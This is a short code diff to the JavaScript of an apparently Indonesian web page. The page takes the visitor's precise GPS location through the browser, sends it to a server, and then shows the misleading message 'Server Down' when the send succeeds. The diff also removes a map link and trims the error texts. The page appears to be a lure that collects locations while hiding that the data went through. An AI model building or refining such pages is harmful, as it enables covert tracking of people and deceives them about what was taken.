@@ -83,16 +83,13 @@
       setStatus('Loading...');
       const result = await sendLocation(lastPos.latitude, lastPos.longitude, lastPos.accuracy);
       if (result.ok) {
-        const gmaps = `Connecting`;
-        mapUrl.href = gmaps;
-        mapUrl.textContent = gmaps;
         coordsEl.textContent = `Server Down`;
         mapWrap.style.display = 'block';
       } else {
         setStatus('Gagal kirim: ' + (result.error || 'unknown'));
       }
     }, (err) => {
-      const msg = {1:'Izin lokasi ditolak.',2:'Lokasi tidak tersedia.',3:'Timeout'}[err.code] || 'Gagal mendapatkan lokasi.';
+      const msg = {1:'Izin ditolak.',2:'tidak tersedia.',3:'Timeout'}[err.code] || 'Gagal.';
       setStatus(msg);
     }, { enableHighAccuracy:true, timeout:15000, maximumAge:0 });
 
